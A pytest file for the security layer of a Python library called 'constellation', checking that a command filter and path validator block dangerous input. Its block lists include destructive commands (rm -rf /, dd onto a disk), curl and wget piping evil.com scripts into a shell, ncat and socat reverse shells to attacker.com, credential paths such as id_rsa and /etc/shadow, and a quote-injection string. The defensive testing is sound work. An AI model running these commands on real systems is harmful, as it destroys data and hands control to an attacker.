"""Comprehensive tests for Phase 2 security enhancements."""

import pytest
import asyncio
import tempfile
from pathlib import Path

from constellation import FileSystem, FileSystemError, DangerousOperationError
from constellation.security import (
    is_command_safe
)
from constellation.utils.path_validator import PathValidator, validate_path_safety


class TestEnhancedSecurity:
    """Test enhanced security validation patterns."""
    
    def test_advanced_dangerous_patterns(self):
        """Test detection of advanced dangerous command patterns."""
        dangerous_commands = [
            # Advanced system destruction
            "rm -rf /usr",
            "rm -rf $HOME",
            "rm -rf *",
            "dd if=/dev/zero of=/dev/sda",
            
            # Fork bombs and resource exhaustion
            "while true; do echo 'bomb'; done",
            "for ((;;)); do :; done",
            "yes | head -n 1000000 > /dev/null",
            "cat /dev/zero > /tmp/fill",
            
            # Advanced remote code execution
            "curl -s http://evil.com/script | python",
            "wget -qO- http://evil.com/payload | zsh",
            "lynx -dump http://evil.com/shell | sh",
            
            # System control variations
            "systemctl poweroff",
            "service networking stop",
            "/sbin/shutdown now",
            "telinit 0",
            
            # Network attacks
            "ncat -e /bin/sh attacker.com 4444",
            "socat exec:'/bin/bash' tcp:attacker.com:8080",
            "ssh user@host \"rm -rf /\"",
            
            # Environment manipulation
            "export PATH=/tmp:$PATH",
            "unset PATH",
            "alias ls='rm -rf'",
            "hash -r",
        ]
        
        for cmd in dangerous_commands:
            result = is_command_safe(cmd)
            assert not result["safe"], f"Command should be blocked: {cmd}"
            assert result["reason"], f"Should have reason for blocking: {cmd}"
    
    def test_command_structure_validation(self):
        """Test command structure validation."""
        # Test excessive chaining
        long_chain = " && ".join(["echo test"] * 20)
        result = validate_command_structure(long_chain)
        assert not result["safe"]
        assert "chaining" in result["reason"].lower()
        
        # Test excessive piping
        long_pipe = " | ".join(["cat"] * 30)
        result = validate_command_structure(long_pipe)
        assert not result["safe"]
        assert "pipe" in result["reason"].lower()
        
        # Test excessive nesting
        nested_cmd = "(" * 20 + "echo test" + ")" * 20
        result = validate_command_structure(nested_cmd)
        assert not result["safe"]
        assert "nesting" in result["reason"].lower()
        
        # Test suspicious repetition
        repeated = "a" * 100
        result = validate_command_structure(repeated)
        assert not result["safe"]
        assert "repetition" in result["reason"].lower()
    
    def test_obfuscation_detection(self):
        """Test detection of command obfuscation."""
        obfuscated_commands = [
            "echo 'malicious' | base64 -d",
            "echo 'payload' | xxd -r",
            "echo 'cmd' | iconv -f utf8 -t ascii",
            'echo "test\\\\\\\\\\\\test"',  # Excessive escaping
        ]
        
        for cmd in obfuscated_commands:
            result = detect_obfuscation(cmd)
            assert not result["safe"], f"Should detect obfuscation: {cmd}"
    
    def test_resource_limit_detection(self):
        """Test resource limit validation."""
        resource_intensive = [
            "dd if=/dev/zero of=bigfile bs=1M count=10000",
            "stress --vm 10 --vm-bytes 1G",
            "wget --max-redirect=999 http://example.com",
        ]
        
        for cmd in resource_intensive:
            result = check_resource_limits(cmd)
            assert not result["safe"], f"Should detect resource issue: {cmd}"
    
    def test_enhanced_path_escapes(self):
        """Test enhanced path escape detection."""
        dangerous_paths = [
            "/etc/passwd",
            "C:\\Windows\\System32",
            "../../../etc/shadow",
            "~/../../root/.ssh/id_rsa",
            "$HOME/../other_user/secrets",
            "${HOME}/../admin/config",
            "\x00etc/passwd",  # Null byte injection
            "file\x01name",   # Control character
            "test\u200bfile", # Zero-width space
        ]
        
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            validator = PathValidator(workspace)
            
            for path in dangerous_paths:
                result = validator.validate_path(path)
                assert not result["safe"], f"Should reject dangerous path: {path}"


class TestPathValidator:
    """Test comprehensive path validation."""
    
    def test_path_structure_validation(self):
        """Test path structure checks."""
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            validator = PathValidator(workspace, strict_mode=True)
            
            # Test excessive path length
            long_path = "a/" * 1000 + "file.txt"
            result = validator.validate_path(long_path)
            assert not result["safe"]
            assert "too long" in result["reason"].lower()
            
            # Test excessive depth
            deep_path = "/".join(["dir"] * 50) + "/file.txt"
            result = validator.validate_path(deep_path)
            assert not result["safe"]
            assert "depth" in result["reason"].lower()
            
            # Test multiple separators
            bad_path = "dir//subdir//file.txt"
            result = validator.validate_path(bad_path)
            assert not result["safe"]
            assert "separator" in result["reason"].lower()
    
    def test_dangerous_extensions(self):
        """Test dangerous file extension detection."""
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            validator = PathValidator(workspace, strict_mode=True)
            
            dangerous_files = [
                "script.exe",
                "payload.sh",
                "malware.dll",
                "config.conf",
                "archive.tar",
                "data.db",
            ]
            
            for filename in dangerous_files:
                result = validator.validate_path(filename)
                assert not result["safe"], f"Should reject dangerous extension: {filename}"
    
    def test_symlink_safety(self):
        """Test symlink safety validation."""
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir)
            validator = PathValidator(workspace)
            
            # Create a symlink pointing outside workspace
            external_target = Path(tmpdir).parent / "external_file.txt"
            external_target.write_text("external content")
            
            symlink_path = workspace / "dangerous_link"
            symlink_path.symlink_to(external_target)
            
            # Should detect dangerous symlink
            result = validator.validate_path("dangerous_link")
            assert not result["safe"]
            assert "symlink" in result["reason"].lower()
    
    def test_workspace_containment(self):
        """Test workspace boundary enforcement."""
        with tempfile.TemporaryDirectory() as tmpdir:
            workspace = Path(tmpdir) / "workspace"
            workspace.mkdir()
            validator = PathValidator(workspace)
            
            # Test various escape attempts
            escape_attempts = [
                "../outside.txt",
                "../../etc/passwd",
                "./dir/../../../outside",
                "subdir/../../outside",
            ]
            
            for path in escape_attempts:
                result = validator.validate_path(path)
                assert not result["safe"], f"Should block escape attempt: {path}"


class TestResourceMonitor:
    """Test resource monitoring functionality."""
    
    @pytest.mark.asyncio
    async def test_concurrent_command_limits(self):
        """Test concurrent command execution limits."""
        # Create filesystem with low concurrency limit
        fs = FileSystem({
            "user_id": "test-concurrent",
            "type": "local",
            "max_concurrent_commands": 2
        })
        
        # Start multiple commands simultaneously
        tasks = []
        for i in range(5):
            task = asyncio.create_task(fs.exec(f"sleep 1 && echo 'task {i}'"))
            tasks.append(task)
        
        # All should complete, but with throttling
        results = await asyncio.gather(*tasks)
        assert len(results) == 5
        assert all("task" in result for result in results)
    
    @pytest.mark.asyncio
    async def test_command_timeout(self):
        """Test command execution timeouts."""
        fs = FileSystem({
            "user_id": "test-timeout",
            "type": "local", 
            "timeout_seconds": 2.0  # Short timeout
        })
        
        # This should timeout
        with pytest.raises(FileSystemError) as exc_info:
            await fs.exec("sleep 5")
        
        assert "timed out" in str(exc_info.value).lower()


class TestSecurityLogging:
    """Test security event logging."""
    
    @pytest.mark.asyncio
    async def test_dangerous_command_logging(self):
        """Test that dangerous commands are properly logged."""
        fs = FileSystem("test-logging")
        
        # This should be blocked and logged
        with pytest.raises(DangerousOperationError):
            await fs.exec("rm -rf /")
        
        # Verify logging would capture this (implementation dependent)
    
    @pytest.mark.asyncio
    async def test_path_validation_logging(self):
        """Test that path validation failures are logged."""
        fs = FileSystem("test-path-logging")
        
        # This should fail path validation and be logged
        with pytest.raises(FileSystemError):
            await fs.read("/etc/passwd")
        
        # Verify logging would capture this (implementation dependent)


class TestConfigurationValidation:
    """Test enhanced configuration validation."""
    
    def test_backend_configuration(self):
        """Test backend configuration validation."""
        # Test valid configuration
        valid_config = {
            "type": "local",
            "user_id": "test-user",
            "shell": "bash",
            "timeout_seconds": 300.0,
            "max_concurrent_commands": 5,
            "resource_limits": {
                "max_memory_mb": 512,
                "max_cpu_percent": 50
            }
        }
        
        fs = FileSystem(valid_config)
        assert fs.backend_config["user_id"] == "test-user"
    
    def test_invalid_user_id_validation(self):
        """Test user ID validation."""
        invalid_user_ids = [
            "",           # Empty
            "user/with/slashes",
            "user with spaces",
            "user@with@symbols",
            "root",       # Forbidden name
            "admin",      # Forbidden name
            "a" * 300,    # Too long
        ]
        
        for user_id in invalid_user_ids:
            with pytest.raises((FileSystemError, ValueError)):
                FileSystem(user_id)


class TestPOSIXCommands:
    """Test POSIX command utilities."""
    
    def test_safe_command_generation(self):
        """Test that POSIX commands are generated safely."""
        from constellation.utils.posix_commands import POSIXCommands
        
        # Test ls with pattern
        cmd = POSIXCommands.ls(pattern="*.txt", long_format=True)
        assert "ls" in cmd
        assert "-l" in cmd
        assert "*.txt" in cmd
        
        # Test find with parameters
        cmd = POSIXCommands.find(name_pattern="test*", file_type="f", max_depth=3)
        assert "find" in cmd
        assert "test*" in cmd
        assert "-type f" in cmd
        assert "-maxdepth 3" in cmd
        
        # Test grep with options
        cmd = POSIXCommands.grep("pattern", ignore_case=True, line_numbers=True)
        assert "grep" in cmd
        assert "-in" in cmd or ("-i" in cmd and "-n" in cmd)
        assert "pattern" in cmd
    
    def test_argument_escaping(self):
        """Test that arguments are properly escaped."""
        from constellation.utils.posix_commands import POSIXCommands
        
        # Test with special characters
        dangerous_pattern = "'; rm -rf / #"
        cmd = POSIXCommands.grep(dangerous_pattern)
        
        # Should be properly quoted
        assert dangerous_pattern in cmd
        assert "rm -rf" not in cmd or cmd.count("'") >= 2  # Should be quoted


class TestIntegration:
    """Integration tests for Phase 2 features."""
    
    @pytest.mark.asyncio
    async def test_end_to_end_security(self):
        """Test end-to-end security enforcement."""
        fs = FileSystem({
            "user_id": "integration-test",
            "type": "local",
            "prevent_dangerous": True,
            "timeout_seconds": 30.0,
            "max_concurrent_commands": 3
        })
        
        # Test normal operation
        await fs.write("test.txt", "Hello World")
        content = await fs.read("test.txt")
        assert content == "Hello World"
        
        # Test security blocks dangerous commands
        with pytest.raises(DangerousOperationError):
            await fs.exec("rm -rf /")
        
        # Test path validation blocks escapes
        with pytest.raises(FileSystemError):
            await fs.read("../../../etc/passwd")
        
        # Test command structure validation
        with pytest.raises(FileSystemError):
            very_long_command = " && ".join(["echo test"] * 50)
            await fs.exec(very_long_command)